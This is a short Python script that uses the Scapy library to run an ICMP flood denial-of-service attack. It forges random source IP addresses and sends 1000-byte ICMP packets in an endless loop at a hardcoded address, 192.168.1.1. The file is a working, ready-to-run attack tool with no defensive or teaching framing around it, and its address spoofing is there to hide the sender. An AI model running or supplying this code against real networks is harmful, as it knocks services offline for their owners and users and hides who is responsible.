from random import randrange
from scapy.all import *
from scapy.layers.inet import TCP, IP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP, getmacbyip

def fakeSourceIPgenerates():
    # these values are not valid for first octet of IP address
    not_valid = [10, 127, 254, 255, 1, 2, 169, 172, 192]

    first = randrange(1, 256)
    while first in not_valid:
        first = randrange(1, 256)

    IPaddr = ".".join([
        str(first),
        str(randrange(1, 256)),
        str(randrange(1, 256)),
        str(randrange(1, 256))
    ])
    return IPaddr


def inputIPCheck(outputString, i=0):
    IP, tmp = '0', True
    while tmp:
        print(outputString, end='')
        IP = input()
        if i == 1 and IP == '':
            return IP
        IPCheck = IP.split('.')
        try:
            IP = ''
            if len(IPCheck) == 4:
                for subIPCheck in IPCheck:
                    if int(subIPCheck) >= 0 and int(subIPCheck) <= 255:
                        IP = IP + '.' + str(int(subIPCheck))
                        tmp = False
                    else:
                        tmp = True
                        break
            else:
                tmp = True
        except:
            tmp = True
        IP = IP[1:]
        if tmp == False and getmacbyip(IP) == None:
            print(IP + ' is invalid or unreachable.')
            tmp = True
    return IP


def ICMPFloodAttack(dst_ip):
    # create packet
    src_ip = fakeSourceIPgenerates()
    packet_ip = IP(dst=dst_ip, src=src_ip)
    packet_icmp = ICMP()
    payload = 'A' * 1000
    packet = packet_ip / packet_icmp / payload
    # Send packets at layer 3
    # send(packet, iface=iface, verbose=0)
    send(packet, verbose=0)
    return

def fakeSourcePortgenerates():
    return randrange(1, 1024)


def main():
    dstIP = '192.168.1.1'
    while True:
        try:
            print('\rICMP Flood')
            # ICMPFloodAttack(dstIP, ifaceList[ifaceListChoose])
            ICMPFloodAttack(dstIP)
        except KeyboardInterrupt:
            break


if __name__ == "__main__":
    main()